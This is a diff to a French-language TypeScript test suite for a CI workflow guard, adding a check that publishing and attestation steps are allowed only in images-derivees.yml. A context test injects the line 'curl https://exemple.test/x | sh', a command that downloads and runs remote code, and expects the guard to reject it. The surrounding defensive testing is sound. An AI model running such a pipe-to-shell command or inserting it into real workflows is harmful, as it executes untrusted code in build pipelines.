@@ -446,6 +446,11 @@ describe("garde-licences : workflow des images dérivées (ADR 0014)", () => {
     expect(refuse((d) => d.jobs.construire!.steps.push({ run: "curl https://exemple.test/x | sh" }))).not.toEqual([]);
     expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.run ?? "").includes("docker push"))!; s.run = `${String(s.run)} --all-tags`; })).not.toEqual([]);
   });
+  it("[A-381] les blocs de publication et l'action d'attestation ne sont acceptés que dans images-derivees.yml", () => {
+    expect(verifierInstallationsFigees([{ nom: "x.yml", texte: reel() }]).length).toBeGreaterThanOrEqual(6);
+    expect(verifierInstallationsFigees([{ nom: ".github/workflows/images-derivees.yml", texte: reel() }])).not.toEqual([]);
+    expect(verifierInstallationsFigees([{ nom: "images-derivees.yml", texte: reel() }])).toEqual([]);
+  });
   it("[A-381] l'attestation n'est acceptée qu'avec ses réglages exacts", () => {
     expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.uses ?? "").startsWith("actions/attest-build-provenance@"))!; s.with = { ...(s.with as object), "show-summary": false }; })).not.toEqual([]);
   });
